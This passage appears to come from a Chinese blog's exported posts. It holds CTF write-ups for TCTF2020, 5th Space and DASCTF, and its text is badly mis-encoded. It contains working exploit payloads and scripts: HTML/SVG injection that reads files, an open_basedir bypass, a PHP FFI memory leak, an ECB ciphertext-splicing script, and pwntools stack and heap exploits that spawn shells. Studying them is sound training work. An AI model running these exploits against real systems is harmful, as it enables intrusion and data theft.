è§£é¢˜æ‹¿åˆ°é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªç”ŸæˆèŠå¤©å›¾ç‰‡çš„é¡µé¢ï¼Œæœ‰ preview å’Œ share ä¸¤ä¸ªæŒ‰é’®ï¼Œå‰è€…ç”¨äºç”Ÿæˆï¼Œåè€…ç”¨äºåˆ†äº«ã€‚ share æŒ‰é’®å¯ä»¥è·å–åˆ°ä¸€ä¸ª urlï¼Œå³ä¸ºç”Ÿæˆå›¾ç‰‡çš„ url è®¿é—®è¯¥è·¯å¾„å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª png çš„è·¯å¾„ï¼Œæµè§ˆå™¨å»è®¿é—®å°±å¯ä»¥å¾—åˆ°ç”Ÿæˆçš„ png å›¾ç‰‡ï¼Œå¦‚æœå°† png æ”¹ä¸º txt åˆ™ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ”¹ä¸º htm å´å¯ä»¥æ­£å¸¸è®¿é—®ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå›æ˜¾ä¸­åŒ…å«æäº¤çš„ä¿¡æ¯å­—æ®µå†…å®¹ï¼Œå¹¶ä¸”è§£æä¸º html äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥è€ƒè™‘å¼•å…¥æ ‡ç­¾è¿›è¡Œé—­åˆï¼Ÿ å…ˆçœ‹ä¸‹ data ä¼ å‚çš„å†…å®¹ï¼š æˆ‘ä»¬æ„é€  data å†…å®¹å»è¯»å–flagè¯•è¯•ï¼Œæ„é€ å¦‚ä¸‹payloadï¼š [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/flag\\\"/&gt;]\"}] æäº¤ä¹‹åç‚¹å‡» share æŒ‰é’®è®¿é—®ï¼Œå¾—åˆ°ç”Ÿæˆçš„å›¾ç‰‡ï¼Œæ”¾å¤§ä¹‹åçœ‹åˆ°å†…å®¹å¦‚ä¸‹ï¼š è¯´æ˜è¿™ä¸ªæ€è·¯æ˜¯å¯¹çš„ï¼Œé‚£å°è¯•è¯»å– web æ–‡ä»¶è·¯å¾„ï¼Œæƒ³è¦è¯»å–/proc/self/ä¸‹çš„å†…å®¹ï¼Œä½†æ˜¯procè¢«è¿‡æ»¤ï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼š [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/prprococ/self\\\"/&gt;]\"}] æäº¤ä¹‹åå†æ¬¡ shareï¼Œå¾—åˆ°å›¾ç‰‡ä¿¡æ¯å¦‚ä¸‹ï¼š è¯´æ˜è¿™ä¸ªæ–¹æ³•æ˜¯æ²¡é—®é¢˜çš„ï¼Œé€šè¿‡å¯»æ‰¾ï¼Œå¯ä»¥å‘ç°/app/app.pyå­˜åœ¨ï¼Œå¹¶ä¸”åŒ…å«å…³é”®ä¿¡æ¯ï¼Œå¦‚ä¸‹payloadè¯»å–ï¼š [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;image width=\\\"512\\\" height=\\\"512\\\" href=\\\"text:/app/app.py\\\"/&gt;]\"}] å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0wsè·¯ç”±ï¼Œè®¿é—®ä¹‹åï¼Œé¡µé¢è·³è½¬ï¼š ä¹Ÿå°±æ˜¯è¦æˆ‘ä»¬å»æ„é€  xssï¼Œä½¿æœåŠ¡ç«¯è§¦å‘ alert(1) ä½†æ˜¯é¢˜ç›®ä¸­å­˜åœ¨CSPï¼š img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self' å¹¶ä¸” src è¢«è¿‡æ»¤ï¼Œè¿˜æ˜¯é€šè¿‡åŒå†™è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯åˆæ‰¾ä¸åˆ°å¯æ§çš„ js æ–‡ä»¶ï¼Œäºæ˜¯è€ƒè™‘ç”¨metaæ ‡ç­¾è¿›è¡Œè·³è½¬ï¼š [{\"type\":0,\"message\":\"[aaa\\\" /&gt;&lt;meMETAta content=\\\"0;url=http://ip/x.html\\\" http-equiv=\\\"refresh\\\"&gt;]\"}] æ³¨æ„ä½¿ç”¨htmåç¼€ã€‚ easyphpè€ƒå¯Ÿ bypass open_basedir è§£é¢˜é¦–å…ˆ phpinfo çœ‹ä¸€ä¸‹ï¼Œå‘ç° disable_functionsã€open_basedirï¼š ç›®å½•ä¸å¯å†™ï¼Œç”¨å¦‚ä¸‹çš„ä»£ç ä¼ å‚è¿‡å»è¯»å–ç›®å½•ï¼š $file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f){ $file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f){ $file_list[] = $f-&gt;__toString();}sort($file_list);foreach ($file_list as $f){ echo \"{$f}\";} å‘ç°äº† flag.h å’Œ flag.o çš„å­˜åœ¨ï¼Œèšå‰‘æ’ä»¶â€œè„šæœ¬æ‰§è¡Œâ€æ‰§è¡Œå¦‚ä¸‹ä»£ç è¯»å– flag.h å†…å®¹ï¼š mkdir('minx');chdir('minx');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag.h'); å¾—åˆ° flag.h çš„å†…å®¹å¦‚ä¸‹ï¼š #define FFI_LIB \"/flag.so\"#define FFI_SCOPE \"flag\"char* flag_fUn3t1on_fFi(); php 7.4å¯ä½¿ç”¨ FFI è°ƒç”¨ c å‡½æ•°ï¼Œäºæ˜¯æŸ¥çœ‹phpinfoï¼Œå¼€å¯äº† FFIã€‚ å†æ‰§è¡Œå¦‚ä¸‹ä»£ç è¯»å–åˆ° flagï¼š $ffi = FFI::load(\"/flag.h\");$a = $ffi-&gt;flag_fUn3t1on_fFi();for ($i=0; $i &lt; 30; $i++) { print_r($a[$i]); } noeasyphpç»§ç»­è€ƒå¯Ÿ FFIï¼Œåªä¸è¿‡phpç‰ˆæœ¬æé«˜äº†ï¼ŒAPIä¹Ÿæ›´æ”¹äº†ã€‚ è§£é¢˜èšå‰‘è„šæœ¬æ‰§è¡Œï¼š var_dump(scandir('glob:///*')) å‘ç°ä»ç„¶å­˜åœ¨ flag.h å’Œ flag.oï¼Œæƒ³åŠæ³•è¯»å– flag.hï¼Œä½†æ˜¯ä¸åƒä¸Šä¸€é¢˜ï¼Œç›´æ¥ç»™å‡ºäº†è¯»å– flag çš„å‡½æ•°åï¼Œå¹¶ä¸”å°† FFI:cdef ç»™ç¦ç”¨äº†ï¼Œåªå¥½åˆ©ç”¨ FFI ä¸­ä¸å†…å­˜ç›¸å…³çš„å‡½æ•°è¿›è¡Œå†…å­˜æ³„éœ²ï¼Œä»è€Œè·å–å‡½æ•°åã€‚ é£˜é›¶å¸ˆå‚…çš„ expï¼š import requestsurl = \"http://pwnable.org:19261\"params = {\"rh\":'''try { $ffi=FFI::load(\"/flag.h\"); //get flag //$a = $ffi-&gt;flag_wAt3_uP_apA3H1(); //for($i = 0; $i &lt; 128; $i++){ echo $a[$i]; //} $a = $ffi-&gt;new(\"char[8]\", false); $a[0] = 'f'; $a[1] = 'l'; $a[2] = 'a'; $a[3] = 'g'; $a[4] = 'f'; $a[5] = 'l'; $a[6] = 'a'; $a[7] = 'g'; $b = $ffi-&gt;new(\"char[8]\", false); $b[0] = 'f'; $b[1] = 'l'; $b[2] = 'a'; $b[3] = 'g'; $newa = $ffi-&gt;cast(\"void*\", $a); var_dump($newa); $newb = $ffi-&gt;cast(\"void*\", $b); var_dump($newb); $addr_of_a = FFI::new(\"unsigned long long\"); FFI::memcpy($addr_of_a, FFI::addr($newa), 8); var_dump($addr_of_a); $leak = FFI::new(FFI::arrayType($ffi-&gt;type('char'), [102400]), false); FFI::memcpy($leak, $newa-0x20000, 102400); $tmp = FFI::string($leak,102400); var_dump($tmp); //var_dump($leak); //$leak[0] = 0xdeadbeef; //$leak[1] = 0x61616161; //var_dump($a); //FFI::memcpy($newa-0x8, $leak, 128*8); //var_dump($a); //var_dump(777);} catch (FFI\\Exception $ex) { echo $ex-&gt;getMessage(), PHP_EOL;}var_dump(1);'''}res = requests.get(url=url,params=params)print((res.text).encode(\"utf-8\")) è·å–åˆ°å‡½æ•°å$a = $ffi-&gt;flag_wAt3_uP_apA3H1(); å†æ¬¡æ‰§è¡Œå¦‚ä¸‹ä»£ç å³å¯è·å– flagï¼š $ffi = FFI::load(\"/flag.h\");$a = $ffi-&gt;flag_wAt3_uP_apA3H1();for ($i=0; $i &lt; 30; $i++) { print_r($a[$i]); } lotteryä¸€é“ web + crypto é¢˜ç›®ï¼Œè€ƒå¯Ÿåˆ†ç»„å¯†ç çš„é‡æ”¾æ”»å‡»ï¼Œåˆ©ç”¨å¤šä¸ªç”¨æˆ·è¿›è¡Œå·é’±ã€‚ è§£é¢˜é¢˜ç›®å…±æœ‰äº”ä¸ªæ¥å£ï¼šregisterã€loginã€buyã€infoã€charge æ³¨å†Œå¹¶ç™»å½•ä¹‹åå¯ä»¥è´­ä¹° lottery æˆ–è€…è´­ä¹° flagï¼Œä½†æ˜¯ coin æ˜æ˜¾ä¸å¤Ÿï¼Œéœ€è¦é€šè¿‡è´­ä¹° lottery æ¥å¢åŠ  coinï¼Œä½†æ˜¯ä»…ä»…è¿™æ ·å‡ ä¹ä¸å¯èƒ½å‡‘å¾—ç‹—é’±å»ä¹° flagã€‚ é¦–å…ˆçœ‹ä¸€ä¸‹ buyã€infoã€chargeä¸‰ä¸ªè·¯ç”±çš„ä½œç”¨ï¼š buy å¯ä»¥è´­ä¹° lotteryï¼Œä»¥æ­¤æ¥å¢åŠ  coinï¼š é€šè¿‡ bp æˆªåŒ…ï¼Œå¯ä»¥å‘ç°ç‚¹å‡» buy ä¹‹åï¼Œä¼šè·³è½¬ info è·¯ç”±ï¼Œè¯¥è·¯ç”±æ˜¯å¯¹ä¸Šå›¾ä¸­ç”Ÿæˆçš„ enc è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡ä¿¡æ¯ï¼š charge è·¯ç”±æ˜¯æäº¤è´­ä¹° lottery çš„ç”³è¯·ï¼š æ¯”èµ›çš„æ—¶å€™å°è¯•ç›´æ¥æ”¹ coin ä¼ å‚çš„å€¼ï¼Œç»“æœè¡Œä¸é€šï¼Œç”±äºä¸çŸ¥é“å¯†æ–‡çš„ç”Ÿæˆæ–¹å¼ï¼Œåé¢å°±æ˜¯å¯†ç å­¦å¸ˆå‚…åšå‡ºæ¥çš„äº†ã€‚èµ›åçœ‹é£˜é›¶å¸ˆå‚…çš„é¢˜è§£æ‰æ˜ç™½æ˜¯åˆ†ç»„å¯†ç çš„é‡æ”¾æ”»å‡»ã€‚ åˆ†æè¿‡ç¨‹ç”Ÿæˆå‡ ç»„å¯†æ–‡ï¼Œç»“æœå‘ç°æ¯ç»„å¯†æ–‡çš„ç»“å°¾æ˜¯ä¸€æ ·çš„ï¼Œ NFEbZFZjCg3gtWhc8Ys7VqHQA95DryQjHRh2tLARA2gqu5s\\/0Tt0wSubjKo9CR7rFnjfKMixVIRY5dbMQ9\\/5AYlLiR7zBGZoi3DhTX7idZjl51uaWb7fyDebazEdvb6joTDaZjFZc5Bt0z8ZhTNb0fbSt9reYD8AcCI4hIXsxZg=KS2YKOxItMGdsfQsaKqRtwIqSIxFrGVl\\/n0QqIvlfMJDLDFMDG67cwWd4r\\/fxwFdi5OUGyUHac9\\/FSi9\\/T54JBdL4iacaoV3cTJciBy8zyODFKFwXCcaytygQNtwfZdEK6FWrCvVHCIYPIch4ewOSPbSt9reYD8AcCI4hIXsxZg= è½¬ä¸º16è¿›åˆ¶å‘ç°æœ€åçš„32ä½å‡ä¸ºf6d2b7dade603f007022388485ecc598ï¼Œåº”è¯¥æ˜¯32ä½çš„paddingï¼ŒåŒæ—¶çœ‹åˆ°å¯†æ–‡æ€»é•¿æ˜¯256ä½ã€‚çŒœæµ‹ä½ECBåˆ†ç»„æ¨¡å¼çš„å¯†ç ï¼Œæ™®éçš„æ”»å‡»æ–¹å¼æ˜¯é‡æ”¾æ”»å‡»ã€‚ é€šè¿‡å¯¹ä¸¤ä¸ªä¸åŒç”¨æˆ·çš„ enc çš„ 16 è¿›åˆ¶æ•°æ®è¿›è¡Œ32ã€64ã€96ã€128ä½çš„æ›¿æ¢ï¼Œå‘ç°å½“æ›¿æ¢128ä½æ—¶ï¼Œå°†ç”¨æˆ·1çš„ lottery å®Œå…¨æ›¿æ¢ä¸ºäº†ç”¨æˆ·2çš„ lotteryï¼Œä½†æ˜¯åŒæ—¶ user çš„å‰ä¸¤ä½ä¹Ÿè¢«æ›¿æ¢äº†ã€‚ è§£é¢˜æ€è·¯å°±æ˜¯é€šè¿‡çˆ†ç ´æ³¨å†Œå¤šä¸ªå¯ä»¥ä½¿ user çš„å‰ä¸¤ä½ä¸€æ ·çš„ç”¨æˆ·ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š import requestsimport randomregister_url = 'http://pwnable.org:2333/user/register'login_url = 'http://pwnable.org:2333/user/login'lottery_url = 'http://pwnable.org:2333/lottery/buy'info_url = 'http://pwnable.org:2333/lottery/info'#charge_url = http://pwnable.org:2333/lottery/chargeusnamelist = \"abcdefghijklmnopqrstuvwxyz\"def register(usname,passwd,url): usname = usname passwd = passwd url = url data = {'username':usname,'password':passwd} r = requests.post(url=url,data=data) return r.contentdef login(usname,passwd,url): usname = usname passwd = passwd url = url data = {'username':usname,'password':passwd} r = requests.post(url=url,data=data) #return r.headers return r.contentdef buy(token,url): token = token url = url data = {'api_token':token} r = requests.post(url=url,data=data) return r.jsondef info(enc,url): enc = enc url = url data = {\"enc\":enc} r = requests.post(url=url,data=data) return r.jsonpasswd = 123for i in range(10000): usname = \"\" for j in range(random.randint(0,20)): usname += random.choice(usnamelist) print(register(usname,passwd,register_url)) å¯ä»¥åˆ©ç”¨ linux çš„ç®¡é“æ–¹ä¾¿åœ°æ‹¿åˆ°æ»¡è¶³è¦æ±‚çš„ç”¨æˆ·ä¿¡æ¯ï¼š python3 lotteryçˆ†ç ´ç”¨æˆ·å.py | grep '\"uuid\":\"bc'b'{\"user\":{\"username\":\"misiifcyboqwa\",\"uuid\":\"bca638f6-ffb4-4c12-8c79-42add23d90e5\",\"updated_at\":\"2020-07-01T05:41:02.000000Z\",\"created_at\":\"2020-07-01T05:41:02.000000Z\",\"id\":630605}}'b'{\"user\":{\"username\":\"pnihrkpjeocgynhz\",\"uuid\":\"bce2d26c-92fa-48fc-a2c2-d5ff5e1da6f5\",\"updated_at\":\"2020-07-01T05:42:09.000000Z\",\"created_at\":\"2020-07-01T05:42:09.000000Z\",\"id\":630734}}'b'{\"user\":{\"username\":\"tkb\",\"uuid\":\"bc10a197-1215-4c4e-bdbe-25145108198d\",\"updated_at\":\"2020-07-01T05:42:46.000000Z\",\"created_at\":\"2020-07-01T05:42:46.000000Z\",\"id\":630799}}'b'{\"user\":{\"username\":\"csuxhbbrdtebsdpue\",\"uuid\":\"bc87488d-caee-411a-bf4f-c75a17090b5a\",\"updated_at\":\"2020-07-01T05:44:52.000000Z\",\"created_at\":\"2020-07-01T05:44:52.000000Z\",\"id\":631052}}'b'{\"user\":{\"username\":\"kncwealurtcj\",\"uuid\":\"bc7a033e-d341-42a0-b931-08592ee81e2f\",\"updated_at\":\"2020-07-01T05:47:43.000000Z\",\"created_at\":\"2020-07-01T05:47:43.000000Z\",\"id\":631362}}'b'{\"user\":{\"username\":\"cwbaszukw\",\"uuid\":\"bc09265e-f0d6-4104-bd11-bd6d29835a00\",\"updated_at\":\"2020-07-01T05:50:03.000000Z\",\"created_at\":\"2020-07-01T05:50:03.000000Z\",\"id\":631663}}'b'{\"user\":{\"username\":\"uhenpkasxlveidif\",\"uuid\":\"bc00fef1-ec7b-48e6-bc86-3f2ee89da15b\",\"updated_at\":\"2020-07-01T05:51:13.000000Z\",\"created_at\":\"2020-07-01T05:51:13.000000Z\",\"id\":631786}}'b'{\"user\":{\"username\":\"vwurpqhaavjihvuqokyx\",\"uuid\":\"bc248486-e6d2-437d-8b2d-ee2c3dad1a72\",\"updated_at\":\"2020-07-01T05:55:55.000000Z\",\"created_at\":\"2020-07-01T05:55:55.000000Z\",\"id\":632333}}'... ç„¶åç”¨ä¸‹é¢çš„ä»£ç è¿›è¡Œæ›¿æ¢ï¼Œå°†å…¶ä»–ç”¨æˆ·çš„ lottery æ›¿æ¢æ‰ user1 çš„ lotteryï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œå°±å¯ä»¥å°†å…¶ä»–ç”¨æˆ·çš„ coin è½¬ç§»ç»™ user1äº†ï¼Œå³å¯è´­ä¹° flagã€‚ import base64import urllibnow_c = \"IpG6gymO3Jhd9hgirFfF\\\\/GZ9An9W7hmfpWnFZEvQ9V4wKQrh4UbaaAm0rp2g2I4WirFyVLzg5KZKQxsPrT53Wot80sjMPhsXy0irOua24Da9KDh1YiMsqS6Q6KJWU5xTdbZ34x8c0bloA9X4\\\\/fMN6vbSt9reYD8AcCI4hIXsxZg=\"#now_c = now_c.decode('utf-8')another_c = \"RNeqoksqjZqjs30IlB4JPaQykvrhhJLviciRBGyYNT0DZbqCkAeQT3L9wJeKwt2FtxIuzzKznobqBur9sRvygvv3jwyYLL1MQR7+AzHT7kug1CQEqkGMqmKZk4ZsdpGluPGbrp5x9YrQ3PKM0MXGcvbSt9reYD8AcCI4hIXsxZg=\"#another_c = another_c.decode('utf-8')now_c = base64.b64decode(now_c).encode('hex')another_c = base64.b64decode(another_c).encode('hex')print now_cprint another_cindex = 128print urllib.quote(base64.b64encode((another_c[:index] + now_c[index:]).decode('hex'))) æ³¨æ„ç”±äºæ¯ä¸ª lottery åªèƒ½ç”¨ä¸€æ¬¡ï¼Œå› æ­¤æ¯ä¸ªç”¨äºæä¾› coin çš„ç”¨æˆ·æ¯æ¬¡éƒ½è¦é‡æ–°ç”Ÿæˆ lotteryï¼Œç„¶åå¯¹ user1 çš„lotteryè¿›è¡Œæ›¿æ¢å³å¯ã€‚ è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œç”±äº token çš„å­˜åœ¨ï¼ŒåŒä¸€å° PC åªèƒ½ä¿æŒä¸€ä¸ªç”¨æˆ·çš„è¿æ¥ï¼Œå†å¼€ä¸€å°è™šæ‹Ÿæœºç™»å½•å…¶ä»–ç”¨æˆ·æä¾› coin å³å¯ã€‚ æ•ˆæœå¦‚ä¸‹ï¼š","link":"/2020/06/29/TCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"ç¬¬äº”ç©ºé—´pwné¢˜ç»ƒä¹ ","text":"è‡ªåšpwné¢˜ä»¥æ¥ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼ŒçœŸæ­£é‡åˆ°é¢˜ç›®æœç„¶æ˜¯ä¸€è„¸æ‡µé€¼ã€‚ã€‚ã€‚æ‹¿ç€å¸ˆå‚…ä»¬çš„wpå­¦ä¹  twiceæ‹¿åˆ°é¢˜ç›®ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶å±æ€§æ˜¯64ä½çš„ELFï¼Œå¯ä»¥å®ç°å›æ˜¾ç”¨æˆ·è¾“å…¥çš„åŠŸèƒ½ã€‚ æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤ï¼Œå‘ç°å¼€å¯äº†NXã€canaryï¼š é¢˜ç›®åˆ†æIDAåç¼–è¯‘å‘ç°åˆ°sub_4007A9å‡½æ•°è°ƒç”¨äº†putså‡½æ•°ï¼Œå¯ä»¥å®ç°æ ˆæº¢å‡º å…¶ä¸­æ ˆç»“æ„å¦‚ä¸‹ï¼š å¯çŸ¥ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¢«ä¿å­˜åˆ°å‚æ•°sçš„ä½ç½®ï¼Œå®ƒåˆ°var_8ï¼ˆå…¶å®å°±æ˜¯canaryï¼‰çš„å¤§å°æ˜¯0x58å­—èŠ‚ï¼Œå› æ­¤æº¢å‡ºçš„éš¾ç‚¹å°±åœ¨äºå¦‚ä½•ç»•è¿‡canaryçš„æ£€æµ‹ï¼Œè¿™é‡Œç”±äºæ˜¯ä¼šå›æ˜¾ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆåœ¨0x58ä¸ªå­—ç¬¦ä¹‹åå†è¾“å…¥ä¸€ä¸ªå­—ç¬¦è¦†ç›–canaryçš„\\x00å­—èŠ‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†canaryè¿å¸¦ä¸€èµ·è¾“å…¥ï¼Œå…¶åçš„æ ˆåº•åœ°å€ä¹Ÿèƒ½ä¸€åŒè¾“å‡ºï¼Œè¿™ä¾¿æ˜¯çªç ´ç‚¹ã€‚ é‚£ä¹ˆæ•´ä½“æ€è·¯å°±æ˜¯ï¼šç¬¬ä¸€æ¬¡è¾“å…¥é€šè¿‡è¦†ç›–canaryä½å­—èŠ‚æ³„éœ²canaryå’Œrbpï¼Œç¬¬äºŒæ¬¡è¾“å…¥åšæ ˆè¿ç§»æ³„éœ²å‡ºlibcåŸºå€ï¼Œéšåå†æ¬¡è¿ç§»åˆ°æ ˆé¡¶ä½ç½®ç„¶åæ„é€ payloadè¦†ç›–è¿”å›åœ°å€ä¸ºone_gadgetï¼Œå³å¯getshellã€‚ expæ¯”èµ›çš„æ—¶å€™å¥½åƒæ²¡æœ‰æä¾› libc ç‰ˆæœ¬ï¼Œè¿™æ ·çš„è¯å°±å¤šäº†ä¸€æ­¥ libcç‰ˆæœ¬çš„ç¡®å®šï¼Œä¸è¿‡åœ¨å¤ç°çš„æ—¶å€™çœ‹åˆ°å¸ˆå‚…ç›´æ¥å†™äº†libc-2.23.soï¼Œè¿™æ ·ä¹Ÿæ–¹ä¾¿å­¦ä¹ äº†ã€‚ å…ˆæ‰¾ä¸€ä¸‹64ä½libc-2.23.soä¸­çš„gadgetï¼š æœ€ç»ˆexpå¦‚ä¸‹ï¼š from pwn import *sh = process('5kjpwn1')elf = ELF('./5kjpwn1')libc = ELF('./libc-2.23.so')rdi_ret = 0x400923push_ebp = 0x4007a9leave_ret = 0x400879payload1 = 'a'*0x58 + 'b'sh.sendafter('&gt;', payload1)sh.recvuntil('b')canary = u64((sh.recv(7)).rjust(8,'\\x00'))stack = u64(sh.recv(6).ljust(8,'\\x00'))payload2 = 'c'*0x08 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(push_ebp)payload2 = payload2.ljust(0x58, 'a')payload2 += p64(canary) + p64(stack-0x70) + p64(leave_ret)sh.sendafter('&gt;', payload2)sh.recvuntil('cccccccc')puts_addr = u64(sh.recv(6).ljust(8, '\\x00'))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']payload3 = 'a'*0x58 + p64(canary) + p64(0) + p64(libc_base + 0x45216)sh.sendafter('&gt;', payload3)sh.interactive() ofè¿™æ˜¯ä¸€é“å †é¢˜ï¼Œé¢˜ç›®æœ‰allocate, edit, show, deleteå‡ ä¸ªåŠŸèƒ½ã€‚å‡ºé¢˜æ–¹ä»urandomè¯»äº†ä¸€ä¸ª8å­—èŠ‚çš„éšæœºæ•°å½“åšcookieï¼Œåªæœ‰cookieæ­£ç¡®æ‰èƒ½åšæ“ä½œï¼Œfreeçš„æ—¶å€™æŠŠcookieæ¸…é›¶ã€‚ç„¶è€Œç¼–è¯‘å™¨(gccå’Œclang)éƒ½ä¼šæŠŠè¿™ä¸ªæ¸…0æ“ä½œç»™ä¼˜åŒ–æ‰ï¼Œå¯¼è‡´UAFã€‚ é¢˜ç›®åˆ†æè®²çœŸçš„ï¼Œçœ‹å¸ˆå‚…ä»¬çš„expæ²¡çœ‹æ‡‚æ˜¯æ€ä¹ˆæçš„ï¼Œå †é¢˜ä¹‹å‰ä¹Ÿæ²¡åˆ·è¿‡å‘¢ã€‚ã€‚ã€‚ è¿œç¨‹æµ‹è¯•å‘ç°å’Œæºç ä¸åŒï¼Œæ²¡æœ‰äº†cookieæ“ä½œï¼Œç›´æ¥æ”¹free_hookè°ƒç”¨systemå³å¯ã€‚ from pwn import *context.log_level=\"debug\"def add(index): p.sendlineafter(\": \",\"1\") p.sendlineafter(\": \",str(index))def edit(index,note): p.sendlineafter(\": \",\"2\") p.sendlineafter(\"Index: \",str(index)) p.sendafter(\"Content: \",note)def show(index): p.sendlineafter(\": \",\"3\") p.sendlineafter(\"Index: \",str(index))def delete(index): p.sendlineafter(\": \",\"4\") p.sendlineafter(\": \",str(index))#p=remote(\"121.36.74.70\",9999)p=process(\"./5kjpwn2\")for i in range(9): add(i)for i in range(8): delete(i)show(7)p.recvuntil(\": \")libc=u64(p.recv(6)+\"\\x00\\x00\")-0x7ffff7dcfca0+0x7ffff79e4000print hex(libc)edit(6,p64(libc+0x003ed8e8))edit(0,\"/bin/sh\\x00\")add(10)add(11)edit(11,p64(libc+0x04f440))delete(0)p.interactive() pwnmeä¸€é“heapé¢˜ç›®ï¼Œåªä¸è¿‡ç¯å¢ƒå˜æˆäº†uclibc + armï¼Œå› ä¸ºuclibcå½“ä¸­ä¹ŸåŠ å…¥äº†tcacheçš„æœºåˆ¶ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡tcacheæœºåˆ¶å¯¹heapä¸Šçš„åœ°å€è¿›è¡Œæ³„éœ²ï¼Œç„¶ååœ¨editå‡½æ•°å½“ä¸­èƒ½å¤Ÿæº¢å‡ºä»»æ„å¤§å°çš„å­—èŠ‚ã€‚å› æ­¤å¯ä»¥ä¿®æ”¹å †åé¢çš„æ•°æ®ï¼Œé€šè¿‡tcache attackï¼ŒåŠ«æŒç¨‹åºçš„æ§åˆ¶æµå°±èƒ½å¤Ÿè¿›è¡ŒROPï¼Œæœ€åè·å¾—ç¨‹åºçš„æ§åˆ¶æƒã€‚ armæ¶æ„ç¨‹åºçš„è°ƒè¯•éœ€è¦æœ‰qemuçš„ç¯å¢ƒï¼Œç„¶åæŒ‰ç…§å¦‚ä¸‹æ­¥éª¤å¯åŠ¨ç»ˆç«¯è¿›è¡Œè°ƒè¯•ï¼š sudo mv ld-uClibc-1.0.34.so ld-uClibc.so.0sudo mv ld-uClibc.so.0 /lib/sudo mv libuClibc-1.0.34.so libc.so.0sudo mv libc.so.0 /lib/ ä¹‹åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯è¿è¡Œç¨‹åº qemu-arm -L ./lib ./a.out æŒ‰ç…§ä¸‹é¢çš„æ“ä½œå¯è¿›è¡Œè°ƒè¯•ï¼š qemu-arm -g 1234 -L ./lib ./a.out ç„¶åå¦å¼€ä¸€ä¸ªç»ˆç«¯ gdb-multiarch ./a.out -qpwndbg&gt; target remote localhost:1234 å³å¯è°ƒè¯•ã€‚ expfrom pwn import *import syscontext.log_level=\"debug\"def show(): p.sendlineafter(\"&gt;&gt;&gt; \",\"1\")def add(l,note): p.sendlineafter(\"&gt;&gt;&gt; \",\"2\") p.sendlineafter(\":\",str(l)) p.sendafter(\":\",note)def change(index,l,note): p.sendlineafter(\"&gt;&gt;&gt; \",\"3\") p.sendlineafter(\":\",str(index)) p.sendlineafter(\":\",str(l)) p.sendafter(\":\",note)def remove(index): p.sendlineafter(\"&gt;&gt;&gt; \",\"4\") p.sendlineafter(\":\",str(index))if len(sys.argv)==1: #p=process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\"./\",\"./a.out\"]) p=remote(\"121.36.58.215\",1337)else: p=process([\"qemu-arm\",\"-L\",\"./\",\"./a.out\"])add(0x18,\"aaaaaaaa\")add(0x4f8,\"aaaaaaaa\")add(0x18,\"aaaaaaaa\")add(0x18,\"aaaaaaaa\")change(0,0x40,\"a\"*0x1c+p64(0x500+0x20+1))remove(1)add(0x4f8,\"aaaaaaaa\")show()p.recvuntil(\"2 : \")libc=u32(p.recv(4))+0xff720000-0xff7ba8ecprint hex(libc)add(0x18,\"aaaaaaa\")add(0x21,\"aaaaaaa\")remove(0)remove(4)change(2,8,p32(0x21048^0x22))add(0x18,\"aaaaa\")add(0x18,\"aaaaa\")change(4,0xf8,\"/bin/sh\\x00\"+p32(0)*4+p32(0x28)+p32(0x21038))change(0,0x8,p32(libc+0x51800))#show()remove(4)p.interactive()","link":"/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/"},{"title":"DASCTFå…­æœˆæœˆèµ›","text":"æƒ³åšPWNæ¥ç€ï¼Œç»“æœ0è§£ï¼Œåˆ’æ°´å‡ é“é¢˜ã€‚ã€‚ã€‚ ç®€å•çš„è®¡ç®—é¢˜æºç ï¼š #!/usr/bin/env python3 # -*- coding: utf-8 -*- from flask import Flask, render_template, request,session from config import create import os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(24) ## flag is in /flag try to get it @app.route('/', methods=['GET', 'POST']) def filter(string): for black_word in black_list: if black_word in string: return \"hack\" return string if request.method == 'POST': input = request.form['input'] create_question = create() input_question = session.get('question') session['question'] = create_question if input_question==None: return render_template('index.html', answer=\"Invalid session please try again!\", question=create_question) if filter(input)==\"hack\": return render_template('index.html', answer=\"hack\", question=create_question) try: calc_result = str((eval(input_question + \"=\" + str(input)))) if calc_result == 'True': result = \"Congratulations\" elif calc_result == 